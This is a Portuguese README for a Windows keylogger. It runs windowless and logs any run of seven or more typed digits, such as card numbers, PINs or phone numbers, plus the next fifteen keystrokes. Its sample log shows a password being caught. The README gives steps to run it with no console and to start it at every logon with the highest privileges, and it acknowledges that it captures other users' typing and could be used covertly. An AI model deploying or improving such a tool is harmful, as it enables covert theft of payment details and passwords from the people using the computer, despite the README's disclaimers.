# Monitor de sequências numéricas (Windows)

Fica rodando em segundo plano e, sempre que alguém digitar **7 ou mais
dígitos seguidos** (ex.: telefone, PIN, número de cartão), grava num
arquivo de texto:

- os dígitos digitados;
- os **15 caracteres seguintes** digitados depois deles.

O log é salvo em `%USERPROFILE%\monitor_numeros.txt` (ex.:
`C:\Users\SeuUsuario\monitor_numeros.txt`).

## Aviso importante

- Isso captura teclas digitadas por **qualquer pessoa** que use o
  computador, incluindo senhas, mensagens, etc., caso venham logo após
  uma sequência numérica. Trate o arquivo de log como informação
  sensível: não o compartilhe, não o suba para nuvem/GitHub, e apague
  quando não precisar mais.
- Use isso apenas no **seu próprio computador**. Se outras pessoas
  (familiares, colegas de casa) o usam, monitorar as digitações delas
  sem que saibam pode ter implicações legais dependendo do seu país —
  verifique a legislação local antes de usar de forma oculta.
- O processo roda sem janela, mas continua aparecendo normalmente no
  Gerenciador de Tarefas (nome do processo `pythonw.exe`) — não há
  nenhuma tentativa de escondê-lo do sistema.

## Instalação

1. Instale o [Python](https://www.python.org/downloads/) (marque a
   opção "Add Python to PATH" durante a instalação).
2. Abra o Prompt de Comando **como administrador** nesta pasta e
   instale as dependências:

   ```bat
   pip install -r requirements.txt
   ```

## Como rodar

### Rodar manualmente (sem janela de console)

Como você pode executar como administrador, abra um Prompt de Comando
ou PowerShell **como administrador** nesta pasta e rode:

```bat
pythonw monitor.pyw
```

`pythonw` (em vez de `python`) executa sem abrir janela de console.
O processo continuará rodando em segundo plano até o computador ser
desligado/reiniciado, ou até você encerrá-lo pelo Gerenciador de
Tarefas (procure por `pythonw.exe`).

### Iniciar automaticamente com o Windows (opcional)

Se quiser que ele inicie sozinho toda vez que o Windows ligar, use o
Agendador de Tarefas do Windows (permite marcar "Executar com os
privilégios mais altos", ou seja, como administrador):

1. Abra o **Agendador de Tarefas** (`taskschd.msc`).
2. **Criar Tarefa** (não "Tarefa Básica", para ter mais opções).
3. Na aba **Geral**: dê um nome, marque **"Executar com privilégios
   mais altos"**.
4. Na aba **Gatilhos**: novo gatilho → **"Ao fazer logon"**.
5. Na aba **Ações**: nova ação → Programa/script:
   `C:\Caminho\para\pythonw.exe`, argumentos:
   `"C:\Caminho\para\keylogger-numeros\monitor.pyw"`.
6. Salve (vai pedir a senha da conta administradora).

## Ver o log

Abra o arquivo `monitor_numeros.txt` na pasta do seu usuário
(`%USERPROFILE%`) com qualquer editor de texto. Cada linha tem o
formato:

```
[2026-08-18 14:32:01] numeros: 9198765 | seguido de: 'is a senha123\n'
```

## Ajustar os parâmetros

No topo do `monitor.pyw` você pode alterar:

- `MIN_DIGITS = 7` → quantos dígitos seguidos disparam a captura.
- `FOLLOWUP_CHARS = 15` → quantos caracteres depois são gravados.
- `LOG_FILE` → caminho do arquivo de log.
